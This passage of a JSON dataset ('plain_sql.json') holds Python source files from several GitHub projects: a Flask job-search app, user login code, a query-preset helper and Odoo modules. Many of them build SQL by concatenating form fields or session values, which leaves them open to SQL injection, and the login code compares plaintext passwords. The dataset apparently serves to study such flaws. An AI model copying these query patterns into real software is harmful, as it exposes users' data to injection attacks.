\"Welcome back! \" + current_user.name\n    if request.method == 'GET':\n        query = '''\n        select tmp.jid as id, tmp.name as name, tmp.type as type,\n               tmp.sal_from as sfrom, tmp.sal_to as sto, \n               tmp.sal_freq as sfreq, tmp.posting_time as ptime\n        from (vacancy v natural join job j) as tmp, application ap\n        where ap.uemail = \\'''' + session[\"user_id\"] + '\\' and ap.jid = tmp.jid and ap.vtype = tmp.type'\n        cursor = g.conn.execute(text(query))\n        data = cursor.fetchall()\n        return render_template(\"user_home_page.html\", message = message, data = data)\n    return render_template(\"user_home_page.html\", message = message)\n\n\n# @Search vacancy with keyword\n@app.route(\"/search\", methods=[\"GET\", \"POST\"])\n@login_required\ndef search_vacancy():\n    if request.method == 'POST':\n        key = str(request.form['keyword']).strip()\n        if not key:\n            return render_template(\"search.html\")\n        attr = request.form.get('attr')\n        ptf = str(request.form['pt_from']).strip()  # posting time from\n        ptt = str(request.form['pt_to']).strip()  # posting time from\n        order = request.form.get('order')\n        order_attr = request.form.get('order_attr')\n        limit = str(request.form['limit']).strip()\n        query = '''\n        select j.jid as id, j.name as name, v.type as type,\n               v.sal_from as sfrom, v.sal_to as sto, \n               v.sal_freq as sfreq ,v.posting_time as ptime\n        from vacancy as v inner join job as j on v.jid = j.jid\n        '''\n        if ptf and ptt:\n            query += 'where v.posting_time>=\\'' + ptf + '\\' and v.posting_time<=\\'' + ptt + '\\' and '\n        elif ptf and not ptt:\n            query += 'where v.posting_time>=\\'' + ptf + '\\' and '\n        elif not ptf and ptt:\n            query += 'where v.posting_time<=\\'' + ptt + '\\' and '\n        else:\n            query += 'where '\n        \n        if attr == 'name':\n            query += 'lower(j.name) like lower(\\'%' + key + '%\\') '    # use lower() to ignore case \n        elif attr == 'salary':\n            query += 'v.sal_from <= ' + key + ' and v.sal_to >=' + key + ' '\n        elif attr == 'skill':\n            query += 'j.pre_skl like \\'%' + key + '%\\' or j.job_des like \\'%''' + key + '%\\' '\n        \n        if order_attr == 'pt':\n            query += 'order by v.posting_time ' + order\n        elif order_attr == 'id':\n            query += 'order by j.jid ' + order\n        elif order_attr == 'name':\n            query += 'order by j.name ' + order\n        elif order_attr == 'lows':\n            query += 'order by v.sal_from ' + order\n        elif order_attr == 'highs':\n            query += 'order by v.sal_to ' + order\n        \n        if limit and limit != 'all':\n            query += ' limit ' + limit\n        cursor = g.conn.execute(text(query))  # !Very important here, must convert type text()\n        job = []\n        for row in cursor:\n            job.append(row)\n        data = job\n        return render_template(\"search.html\", data=data, keyword = key)\n    return render_template(\"search.html\")\n\n# detailed info of a vacancy\n@app.route(\"/detailed_info\", methods=[\"GET\", \"POST\"])\n@login_required\ndef detailed_info():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        select *\n        from vacancy v natural join job j\n        where j.jid=''' + jid + ' and v.type=\\'' + vtype +'\\''\n        cursor = g.conn.execute(text(query))\n        data = cursor.fetchall()\n        col_names = ['JID', 'Type', '# Positions', 'Salary from', 'Salary to', 'Salary Frequency', 'Post Until', 'Posting Time', 'Updated Time', 'Unit', 'Agency', 'Level', 'Job Name', 'Preferred Skills', 'Job Description', 'Location', 'Hour/Shift', 'Title code', 'Civil Service TiTle']  # column header\n        return render_template(\"detailed_info.html\", zippedlist = zip(col_names, data[0]), jid = jid, vtype = vtype) # zip to help us iterate two lists parallelly\n    return render_template(\"detailed_info.html\")\n\n# apply for the vacancy\n@app.route(\"/apply\", methods=[\"GET\", \"POST\"])\n@login_required\ndef apply():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        insert into Application\n        values (\\'''' + session[\"user_id\"] + '\\', ' + jid + ', \\'' + vtype + '\\')'  # Zihan: I tried to use current_user.id here and it returned nothing. So I use session[\"user_id\"] instead.\n        g.conn.execute(text(query))\n        return render_template(\"apply.html\", jid = jid, vtype = vtype)\n    return render_template(\"apply.html\")\n\n# cancel application for the vacancy\n@app.route(\"/canel_apply\", methods=[\"GET\", \"POST\"])\n@login_required\ndef cancel_apply():\n    if request.method == 'POST':\n        jid = request.form.get('jid')\n        vtype = request.form.get('vtype')\n        query = '''\n        delete from Application\n        where uemail=\\'''' + session[\"user_id\"] + '\\' and jid=' + jid + ' and vtype=\\'' + vtype + '\\'' \n        g.conn.execute(text(query))\n        return render_template(\"cancel_apply.html\", jid = jid, vtype = vtype)\n    return render_template(\"cancel_apply.html\")\n\n# some statistic info\n\n# insert job (TBD)\n\n# delete job (TBD)\n\n# update job (TBD)\n\nif __name__ == '__main__':\n    import click\n\n    @click.command()\n    @click.option('--debug', is_flag=True)\n    @click.option('--threaded', is_flag=True)\n    @click.argument('HOST', default='0.0.0.0')\n    @click.argument('PORT', default=8111, type=int)\n    def run(debug, threaded, host, port):\n        \"\"\"\n        This function handles command line parameters.\n        Run the server using\n\n            python server.py\n\n        Show the help text using\n\n            python server.py --help\n\n        \"\"\"\n        HOST, PORT = host, port\n        print \"running on %s:%d\" % (HOST, PORT)\n        app.run(host=HOST, port=PORT, debug=debug, threaded=threaded)\n\n    run()",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Daniel-Bu/w4111-project1/blob/54835e1eac1092a3bb6a40cebea4205e2437a1c6",
        "file_path": "/Web-app/User.py",
        "source": "from flask_login import UserMixin\nfrom flask import g\n\n\nclass User(UserMixin):\n    def __init__(self, email='', password='', name=''):\n        UserMixin.__init__(self)\n        self.email = email\n        self.name = name\n        self.password = password\n        self.valid = False\n        self.id = ''  # Extra id field for Flask-login requirement\n\n    # @This Function verify whether a user is recorded\n    def user_verify(self):\n        eid = self.email\n        code = self.password\n        if eid.strip() == '':\n            return\n        if code.strip() == '':\n            return\n        query = '''select * from usr where email like\\''''+eid+'\\''\n        cursor = g.conn.execute(query)\n        for row in cursor:\n            key = str(row.password)\n            if key.strip() == code.strip():\n                self.name = str(row.name)\n                self.email = eid\n                self.id = eid\n                self.valid = True\n            break\n\n    # @This function insert a new user into database\n    def insert_new_user(self):\n        try:\n            query = '''\n            insert into usr (email,name,password)\n            values (%s,%s,%s)'''\n            if self.email.strip() == '' or self.name.strip() == '' or self.name.strip() =='':\n                return\n            g.conn.execute(query, (self.email, self.name, self.password))\n            self.valid = True\n            if self.valid:\n                self.id = self.email\n        except:\n            print 'invalid user'\n\n    '''\n    Rewrite def in order to get things work\n    '''\n    def is_authenticated(self):\n        if self.valid:\n            return True\n        return False\n\n    def is_active(self):\n        return True\n\n    def get_id(self):\n        return self.id\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/leevic31/Project-Archive/blob/fc415bfa48796c8f76952d08a520a74d1ca91364",
        "file_path": "/src/presetquery.py",
        "source": "import pyxl\nimport mysql.connector\n\nfrom pypika import MySQLQuery, Table, Field\n\n\t# the use of this function assumes there exists some Table\n\t# called 'Presets' where the first column is an\n\t# UNSIGNED AUTO_INCREMENT PRIMARY KEY labeled 'id'\n\t# and the second column is a VARCHAR NOT NULL labeled 'querval'\n\t# and the third column is a VARCHAR NOT NULL labeled 'description'\n\ndef write_preset(conn, queryin, descriptin):\n\t# to use this method you must pass in a connection,\n\t# a preset query, and a description of what the query achieves\n\t# it will automatically write it to the bottom of the table\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\textable = Table('Presets')\n\tq = MySQLQuery.into(extable).columns(\"querval\", \"description\").insert(queryin, descriptin)\n\tprint(q)\n\tquer = str(q)\n\n\tcursor.execute(quer)\n\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\ndef edit_preset(conn, key, queryin, descriptin):\n\t# to use this method you must pass in a connection,\n\t# the id of a preset query,\n\t# a preset query, and a description of what the query achieves\n\t# it will update the query and description at the given id with new values.\n\t# if queryin or descriptin = \"NA\" then it will not update the values written so\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\tif (queryin != \"NA\"):\n\t\tquer = \"UPDATE Presets SET querval='\"+queryin+\"' WHERE id=\"+str(key)+\";\"\n\t\tcursor.execute(quer)\n\tif (descriptin != \"NA\"):\n\t\tquer = \"UPDATE Presets SET description='\"+descriptin+\"' WHERE id=\"+str(key)+\";\"\n\t\tcursor.execute(quer)\n\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\ndef remove_preset(conn, key):\n\t# to use this method you must pass in a connection, and\n\t# what number the preset's id is\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\tquer = \"DELETE FROM Presets WHERE id = \" +key;\n\tcursor.execute(quer)\n\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\ndef get_preset(conn, key):\n\t# to use this method you must pass in a connection\n\t# and the id for the corresponding querval to return\n\t# The querval returned is formatted to be ready to use\n\t# as a query\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\textable = Table('Presets')\n\tq = MySQLQuery.from_(extable).select(\n\t\textable.querval\n\t).where(\n\t\textable.id == key\n\t)\n\tprint(q)\n\tquer = str(q)\n\n\tcursor.execute(quer)\n\n\trow = cursor.fetchone()\n\tstrrow = str(row)\n\n\treturn (strrow[2:-3])\n\ndef get_descriptin(conn, key):\n\t# to use this method you must pass in a connection\n\t# and the id for the corresponding description to return\n\t# The description returned is formatted to be ready to displayed\n\tcursor = conn.cursor()\n\tquer = \"ALTER TABLE Presets DROP COLUMN id;\"\n\tcursor.execute(quer)\n\tquer = \"ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;\"\n\tcursor.execute(quer)\n\n\textable = Table('Presets')\n\tq = MySQLQuery.from_(extable).select(\n\t\textable.description\n\t).where(\n\t\textable.id == key\n\t)\n\tprint(q)\n\tquer = str(q)\n\n\tcursor.execute(quer)\n\n\trow = cursor.fetchone()\n\tstrrow = str(row)\n\n\treturn (strrow[2:-3])\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/EugChesn/uselessScript/blob/35d520843aafd23ab450afc8f708e3df8e3353cf",
        "file_path": "/RedmineProject/Mysql.py",
        "source": "import MySQLdb\nimport config\nclass MysqL(object):\n\n    def __init__(self):\n        try:\n            self.db = MySQLdb.connect(host=config.HOST, user=config.USER, passwd=config.PASSWORD, db=config.DATABASE_NAME)\n        except:\n            self.db = None\n            print 'Error connect'\n\n    def mysqlConfirm(self,task_usr,issue,scop):\n        if self.db is not None:\n            try:\n                redminetask = int(task_usr.redmine_id)\n                username = task_usr.canonical_name\n                email = task_usr.mail\n                status = int(issue.status)\n                scope =  scop #vpn\n\n                cursor = self.db.cursor()\n                cursor.execute(\"\"\"INSERT INTO tasks(redminetask,redmineuser,username,email,scope,status) VALUES (%s,%s,%s,%s,%s,%s)\"\"\",(issue.id,redminetask,username,email,scope,status))\n                self.db.commit()\n                print('The data was successfully loaded')\n            except:\n                print 'Execute Error mysql'\n                self.db.rollback()\n\n    def mysqlSelect(self):\n        if self.db is not None:\n            try:\n                cursor = self.db.cursor()\n                cursor.execute(\"SELECT * FROM tasks\")\n                row = cursor.fetchone()\n                while row is not None:\n                    print(row)\n                    #r = row[0]\n                    row = cursor.fetchone()\n            except:\n                print (\"The data was successfully read\")\n                self.db.rollback()\n\n    def mysqlClear(self):\n        if self.db is not None:\n            try:\n                cursor = self.db.cursor()\n                cursor.execute(\"DELETE FROM tasks\")\n                self.db.commit()\n                print ('The database has been successfully cleaned')\n            except:\n                print ('Cleaning databases error!')\n                self.db.rollback()\n\n    def mysqlDelete(self,task_id):\n        if self.db is not None:\n            try:\n                sql_str = \"DELETE FROM tasks WHERE redminetask = '%s' \"\n                cursor = self.db.cursor()\n                cursor.execute(sql_str, (task_id,))\n                self.db.commit()\n                print ('The database has been successfully cleaned')\n            except:\n                print ('Delete databases error!')\n                self.db.rollback()\n\n    def mysqlDisconnect(self):\n        try:\n            self.db.close()\n            print ('Disconnect complete successful')\n        except:\n            print ('Disconnect db error')\n\nif __name__ == '__main__':\n    print('Please run to RedmineScript.py')\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jobiols/cl-iomaq/blob/5e70ec4084296a2d420ee4f81a7a5af3d75fc774",
        "file_path": "/product_autoload/models/product.py",
        "source": "# -*- coding: utf-8 -*-\n# Part of Odoo. See LICENSE file for full copyright and licensing details.\nfrom openerp import api, models, fields\nimport logging\nfrom datetime import datetime, timedelta\n\n_logger = logging.getLogger(__name__)\n\n\nclass ProductTemplate(models.Model):\n    _inherit = \"product.template\"\n\n    item_code = fields.Char(\n        help=\"Code from bulonfer, not shown\",\n        select=1\n    )\n    upv = fields.Integer(\n        help='Group Wholesaler'\n    )\n    wholesaler_bulk = fields.Integer(\n        help=\"Bulk Wholesaler quantity of units\",\n    )\n    retail_bulk = fields.Integer(\n        help=\"Bulk retail quantity of units\",\n    )\n    invalidate_category = fields.Boolean(\n        help=\"True if the asociated category needs rebuild\",\n        default=False\n    )\n    # TODO rename to invoice_cost requiere migracion\n    system_cost = fields.Float(\n        # compute=\"_compute_system_cost\",\n        help=\"Cost price based on the purchase invoice\"\n    )\n    margin = fields.Float(\n        help=\"Margin % from today cost to list price\"\n    )\n    # TODO renombrar a today_cost, require migracion\n    bulonfer_cost = fields.Float(\n        help=\"Today cost in product currency, it is automatically updated \"\n             \"when the prices coming from Bulonfer are processed.\\n\"\n             \"Or when a price sheet is loaded for no Bulonfer vendors\"\n    )\n    cost_history_ids = fields.One2many(\n        comodel_name=\"stock.quant\",\n        inverse_name=\"product_tmpl_id\",\n        domain=[('location_id.usage', '=', 'internal')]\n    )\n    parent_price_product = fields.Char(\n        help='default_code of the product to get prices from'\n    )\n\n    def oldest_quant(self, prod):\n        \"\"\" Retorna el quant mas antiguo de este producto.\n        \"\"\"\n        quant_obj = self.env['stock.quant']\n        return quant_obj.search([('product_tmpl_id', '=', prod.id),\n                                 ('location_id.usage', '=', 'internal')],\n                                order='in_date', limit=1)\n\n    def closest_invoice_line(self, prod, date_invoice):\n        \"\"\" Encuentra la linea de factura mas cercana a la fecha de ingreso del\n            ultimo quant del producto. Si no hay stock busca la mas cercana\n            a date_invoice\n        \"\"\"\n        in_date = self.oldest_quant(prod).in_date\n        if not in_date:\n            in_date = date_invoice\n\n        # busca el la linea de factura con prod_id mas cercano a in_date\n        # TODO quitar ai.date_invoice para retornar solo los ids\n\n        query = \"\"\"\n            SELECT ail.id, ai.date_invoice\n            FROM account_invoice_line ail\n            INNER JOIN account_invoice ai\n              ON ail.invoice_id = ai.id\n            INNER JOIN product_product pp\n              on ail.product_id = pp.id\n            INNER JOIN product_template pt\n              on pp.product_tmpl_id = pt.id\n            WHERE pt.id = %d AND\n                  ai.discount_processed = true\n            ORDER BY abs(ai.date_invoice - date '%s')\n            LIMIT 1;\n        \"\"\" % (prod.id, in_date)\n\n        self._cr.execute(query)\n        # TODO Renombrar a invoice_line_ids\n        invoice_lines = self._cr.fetchall()\n\n        if invoice_lines:\n            invoice_lines_obj = self.env['account.invoice.line']\n            for invoice_line in invoice_lines:\n                return invoice_lines_obj.browse(invoice_line[0])\n        else:\n            return False\n\n    @api.multi\n    def set_invoice_cost(self):\n        \"\"\"\n            Intenta calcular el system_cost (future invoice_cost) buscando el\n            costo en la linea de factura mas cercana al quant mas viejo, si\n            no hay stock es la ultima factura.\n\n            Esto vale para cualquier proveedor no solo bulonfer.\n        \"\"\"\n        for prod in self:\n            # encontrar la factura mas cercana a la fecha de ingreso del quant\n            # mas antiguo, si no hay stock intenta traer la ultima factura\n            invoice_line = self.closest_invoice_line(\n                prod,\n                datetime.today().strftime('%Y-%m-%d'))\n\n            invoice_price = 0\n            if invoice_line and invoice_line.price_unit:\n                # precio que cargaron en la factura de compra\n                invoice_price = invoice_line.price_unit\n                # descuento en la linea de factura\n                invoice_price *= (1 - invoice_line.discount / 100)\n                # descuento global en la factura\n                invoice_price *= (1 + invoice_line.invoice_discount)\n\n                if invoice_line.invoice_id.partner_id.ref == 'BULONFER':\n                    # descuento por nota de credito al final del mes esto\n                    # vale solo para bulonfer\n                    invoice_price *= (1 - 0.05)\n\n            prod.system_cost = invoice_price\n            _logger.info('Setting invoice cost '\n                         '$ %d - %s' % (invoice_price, prod.default_code))\n\n    def insert_historic_cost(self, vendor_ref, min_qty, cost,\n                             vendors_code, date):\n        \"\"\" Inserta un registro en el historico de costos del producto\n        \"\"\"\n        # TODO evitar que se generen registros duplicados aqui\n\n        vendor_id = self.get_vendor_id(vendor_ref)\n        # arma el registro para insertar\n        supplierinfo = {\n            'name': vendor_id.id,\n            'min_qty': min_qty,\n            'price': cost,\n            'product_code': vendors_code,  # vendors product code\n            'product_name': self.name,  # vendors product name\n            'date_start': date,\n            'product_tmpl_id': self.id\n        }\n\n        # obtener los registros abiertos deberia haber solo uno o ninguno\n        sellers = self.seller_ids.search(\n            [('name', '=', vendor_id.id),\n             ('product_tmpl_id', '=', self.id),\n             ('date_end', '=', False)])\n\n        # restar un dia y cerrar los registros\n        for reg in sellers:\n            dt = datetime.strptime(date[0:10], \"%Y-%m-%d\")\n            dt = datetime.strftime(dt - timedelta(1), \"%Y-%m-%d\")\n            # asegurarse de que no cierro con fecha < start\n            reg.date_end = dt if dt >= reg.date_start else reg.date_start\n\n        # pongo un registro con el precio del proveedor\n        self.seller_ids = [(0, 0, supplierinfo)]\n\n    def get_vendor_id(self, vendor_ref):\n        # obtiene el vendor_id a partir del vendor_ref\n        vendor_id = self.env['res.partner'].search(\n            [('ref', '=', vendor_ref)])\n        if not vendor_id:\n            raise Exception('Vendor %s not found' % vendor_ref)\n        return vendor_id\n\n    @api.multi\n    def set_prices(self, cost, vendor_ref, price=False, date=False, min_qty=1,\n                   vendors_code=False):\n        \"\"\" Setea el precio, costo y margen (no bulonfer) del producto\n\n            - Si el costo es cero y es bulonfer se pone obsoleto y termina.\n            - Agrega una linea al historico de costos\n            - Si no hay quants en stock standard_price = cost\n            - bulonfer_cost = cost\n            - Si es bulonfer list_price = cost * (1 + margin)\n            - Si no es bulonfer list_price = price\n        \"\"\"\n        # TODO ver si se puede hacer esto mas arriba o sea cuando recibo el\n        # registro de data.csv para que no llegue aca.\n        # TODO marcar los obsoletos con un color\n        self.ensure_one()\n        for prod in self:\n            # si el costo es cero y es bulonfer pongo como obsoleto y termino\n            if not cost and vendor_ref == 'BULONFER':\n                prod.state = 'obsolete'\n                return\n            prod.state = 'sellable'\n\n            if not date:\n                date = datetime.today().strftime('%Y-%m-%d')\n\n            # agrega una linea al historico de costos\n            self.insert_historic_cost(vendor_ref, min_qty, cost, vendors_code,\n                                      date)\n\n            # buscar si hay quants\n            quant = self.oldest_quant(prod)\n            self.fix_quant_data(quant, prod, cost)\n\n            prod.bulonfer_cost = cost\n\n            if vendor_ref == 'BULONFER':\n                item_obj = self.env['product_autoload.item']\n                item = item_obj.search([('code', '=', prod.item_code)])\n\n                prod.margin = 100 * item.margin\n                prod.list_price = cost * (item.margin + 1)\n            else:\n                prod.list_price = price\n                prod.margin = 100 * (price / cost - 1) if cost != 0 else 1e10\n\n    def fix_quant_data(self, quant, prod, cost):\n        \"\"\" Overrideable function\n        \"\"\"\n        if not quant:\n            # si no hay quants el costo es el de hoy\n            prod.standard_price = cost\n\n    @api.model\n    def get_price_from_product(self):\n        \"\"\" Procesar los productos que tienen el parent_price_product asignado\n            Se lanza desde cron despues de que corre el autoload\n        \"\"\"\n        prod_obj = self.env['product.template']\n\n        # Busco los que tienen parent price product\n        prods = prod_obj.search([('parent_price_product', '!=', False)])\n        for prod in prods:\n            default_code = prod.parent_price_product\n            parent = prod_obj.search([('default_code', '=', default_code)])\n            # si ya tiene bien el precio no lo proceso para que no me quede\n            # en el historico de precios.\n            if parent and parent.list_price != prod.list_price:\n                # imaginamos que el costo es la decima parte.\n                cost = parent.list_price / 10\n                prod.set_prices(cost, 'EFACEC', price=parent.list_price)\n                _logger.info('setting price product %s' % prod.default_code)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/OCA/crm/blob/dff51393caeaa75ddae9376f775734d0b3a8887b",
        "file_path": "/crm_phonecall/models/crm_lead.py",
        "source": "# -*- coding: utf-8 -*-\n# Copyright (C) 2004-today OpenERP SA (<http://www.openerp.com>)\n# Copyright (C) 2017 Tecnativa - Vicent Cubells\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\n\nfrom openerp import api, fields, models\n\n\nclass CrmLead(models.Model):\n    _inherit = \"crm.lead\"\n\n    phonecall_ids = fields.One2many(\n        comodel_name='crm.phonecall',\n        inverse_name='opportunity_id',\n        string='Phonecalls',\n    )\n    phonecall_count = fields.Integer(\n        compute='_phonecall_count',\n        string=\"Phonecalls\",\n    )\n\n    @api.multi\n    def _phonecall_count(self):\n        for lead in self:\n            lead.phonecall_count = self.env[\n                'crm.phonecall'].search_count(\n                [('opportunity_id', '=', lead.id)])\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/OCA/crm/blob/dff51393caeaa75ddae9376f775734d0b3a8887b",
        "file_path": "/crm_phonecall/report/crm_phonecall_report.py",
        "source": "# -*- coding: utf-8 -*-\n# Copyright 2004-2010 Tiny SPRL (<http://tiny.be>)\n# Copyright 2017 Tecnativa - Vicent Cubells\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\n\nfrom odoo import tools\nfrom odoo import api, fields, models\n\nAVAILABLE_STATES = [\n    ('draft', 'Draft'),\n    ('open', 'Todo'),\n    ('cancel', 'Cancelled'),\n    ('done', 'Held'),\n    ('pending', 'Pending')\n]\n\n\nclass CrmPhonecallReport(models.Model):\n    _name = \"crm.phonecall.report\"\n    _description = \"Phone calls by user\"\n    _auto = False\n\n    user_id = fields.Many2one(\n        comodel_name='res.users',\n        string='User',\n        readonly=True,\n    )\n    team_id = fields.Many2one(\n        comodel_name='crm.team',\n        string='Team',\n        readonly=True,\n    )\n    priority = fields.Selection(\n        selection=[\n            ('0', 'Low'),\n            ('1', 'Normal'),\n            ('2', 'High')\n        ],\n        string='Priority',\n    )\n    nbr_cases = fields.Integer(\n        string='# of Cases',\n        readonly=True,\n    )\n    state = fields.Selection(\n        AVAILABLE_STATES,\n        string='Status',\n        readonly=True,\n    )\n    create_date = fields.Datetime(\n        string='Create Date',\n        readonly=True,\n        index=True,\n    )\n    delay_close = fields.Float(\n        string='Delay to close',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n        help=\"Number of Days to close the case\",\n    )\n    duration = fields.Float(\n        string='Duration',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n    )\n    delay_open = fields.Float(\n        string='Delay to open',\n        digits=(16, 2),\n        readonly=True,\n        group_operator=\"avg\",\n        help=\"Number of Days to open the case\",\n    )\n    partner_id = fields.Many2one(\n        comodel_name='res.partner',\n        string='Partner',\n        readonly=True,\n    )\n    company_id = fields.Many2one(\n        comodel_name='res.company',\n        string='Company',\n        readonly=True,\n    )\n    opening_date = fields.Datetime(\n        readonly=True,\n        index=True,\n    )\n    date_closed = fields.Datetime(\n        string='Close Date',\n        readonly=True,\n        index=True)\n\n    def _select(self):\n        select_str = \"\"\"\n            select\n                id,\n                c.date_open as opening_date,\n                c.date_closed as date_closed,\n                c.state,\n                c.user_id,\n                c.team_id,\n                c.partner_id,\n                c.duration,\n                c.company_id,\n                c.priority,\n                1 as nbr_cases,\n                c.create_date as create_date,\n                extract(\n                  'epoch' from (\n                  c.date_closed-c.create_date))/(3600*24) as delay_close,\n                extract(\n                  'epoch' from (\n                  c.date_open-c.create_date))/(3600*24) as delay_open\n           \"\"\"\n        return select_str\n\n    def _from(self):\n        from_str = \"\"\"\n            from crm_phonecall c\n        \"\"\"\n        return from_str\n\n    @api.model_cr\n    def init(self):\n\n        tools.drop_view_if_exists(self._cr, self._table)\n        self._cr.execute(\"\"\"\n            create or replace view %s as (\n                %s\n                %s\n            )\"\"\" % (self._table, self._select(), self._from()))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ComputerScienceHouse/packet/blob/25709c2e7009cb7915ea7e25eed04aa3bdd36581",
        "file_path": "/packet/member.py",
        "source": "from collections import namedtuple\nfrom logging import getLogger\n\nfrom sqlalchemy import exc\n\nfrom .models import db, REQUIRED_MISC_SIGNATURES\nfrom .packet import get_number_required, get_misc_signatures\n\nLOGGER = getLogger(__name__)\n\n\ndef current_packets(member, intro=False, onfloor=False):\n    \"\"\"\n    Get a list of currently open packets with the signed state of each packet.\n    :param member: the member currently viewing all packets\n    :param intro: true if current member is an intro member\n    :param other: true if current member is off floor or alumni\n    :return: <tuple> a list of packets that are currently open, and their attributes\n    \"\"\"\n\n    # Tuple for compatibility with UI code.  Should be refactored or deleted altogether later\n    SPacket = namedtuple('spacket', ['rit_username', 'name', 'did_sign', 'total_signatures', 'required_signatures'])\n\n    packets = []\n    required = get_number_required()\n\n    if intro and onfloor:\n        required -= 1\n\n    signed_packets = get_signed_packets(member, intro, onfloor)\n    misc_signatures = get_misc_signatures()\n\n    try:\n        for pkt in query_packets_with_signed():\n            signed = signed_packets.get(pkt.username)\n            misc = misc_signatures.get(pkt.username)\n            if signed is None:\n                signed = False\n            if misc is None:\n                misc = 0\n            if misc > REQUIRED_MISC_SIGNATURES:\n                misc = REQUIRED_MISC_SIGNATURES\n            packets.append(SPacket(pkt.username, pkt.name, signed, pkt.received + misc, required))\n\n    except exc.SQLAlchemyError as e:\n        LOGGER.error(e)\n        raise e\n\n    return packets\n\n\ndef get_signed_packets(member, intro=False, onfloor=False):\n    \"\"\"\n    Get a list of all packets that a member has signed\n    :param member: member retrieving prior packet signatures\n    :param intro: is the member an intro member?\n    :param onfloor: is the member on floor?\n    :return: <dict> usernames mapped to signed status\n    \"\"\"\n    signed_packets = {}\n\n    try:\n        if intro and onfloor:\n            for signature in query_signed_intromember(member):\n                signed_packets[signature.username] = signature.signed\n\n        if not intro:\n            if onfloor:\n                for signature in query_signed_upperclassman(member):\n                    signed_packets[signature.username] = signature.signed\n\n            else:\n                for signature in query_signed_alumni(member):\n                    signed_packets[signature.username] = bool(signature.signed)\n\n    except exc.SQLAlchemyError as e:\n        LOGGER.error(e)\n        raise e\n\n    return signed_packets\n\n\ndef query_packets_with_signed():\n    \"\"\"\n    Query the database and return a list of currently open packets and the number of signatures they currently have\n    :return: a list of results: intro members with open packets, their name, username, and number of signatures received\n    \"\"\"\n    try:\n        return db.engine.execute(\"\"\"\n        SELECT packets.username AS username, packets.name AS name, coalesce(packets.sigs_recvd, 0) AS received \n         FROM ( ( SELECT freshman.rit_username \n         AS username, freshman.name AS name, packet.id AS id, packet.start AS start, packet.end AS end \n         FROM freshman INNER JOIN packet ON freshman.rit_username = packet.freshman_username) AS a \n                       LEFT JOIN (  SELECT totals.id  AS id, coalesce(sum(totals.signed), 0)  AS sigs_recvd \n                       FROM ( SELECT packet.id AS id, coalesce(count(signature_fresh.signed), 0) AS signed \n                       FROM packet FULL OUTER JOIN signature_fresh ON signature_fresh.packet_id = packet.id \n                       WHERE signature_fresh.signed = TRUE  AND packet.start < now() AND now() < packet.end \n                       GROUP BY packet.id \n                       UNION SELECT packet.id AS id, coalesce(count(signature_upper.signed), 0) AS signed FROM packet \n                       FULL OUTER JOIN signature_upper ON signature_upper.packet_id = packet.id \n                       WHERE signature_upper.signed = TRUE AND packet.start < now() AND now() < packet.end \n                       GROUP BY packet.id ) totals GROUP BY totals.id ) AS b ON a.id = b.id ) AS packets \n                       WHERE packets.start < now() AND now() < packets.end; \n                                \"\"\")\n\n    except exc.SQLAlchemyError:\n        raise exc.SQLAlchemyError(\"Error: Failed to get open packets with signatures received from database\")\n\n\ndef query_signed_intromember(member):\n    \"\"\"\n    Query the database and return the list of packets signed by the given intro member\n    :param member: the user making the query\n    :return: list of results matching the query\n    \"\"\"\n    try:\n        return db.engine.execute(\"\"\"\n            SELECT DISTINCT packet.freshman_username AS username, signature_fresh.signed AS signed FROM packet \n            INNER JOIN signature_fresh ON packet.id = signature_fresh.packet_id \n            WHERE signature_fresh.freshman_username = '\"\"\" + member + \"';\")\n\n    except exc.SQLAlchemyError:\n        raise exc.SQLAlchemyError(\"Error: Failed to get intromember's signatures from database\")\n\n\ndef query_signed_upperclassman(member):\n    \"\"\"\n    Query the database and return the list of packets signed by the given upperclassman\n    :param member: the user making the query\n    :return: list of results matching the query\n    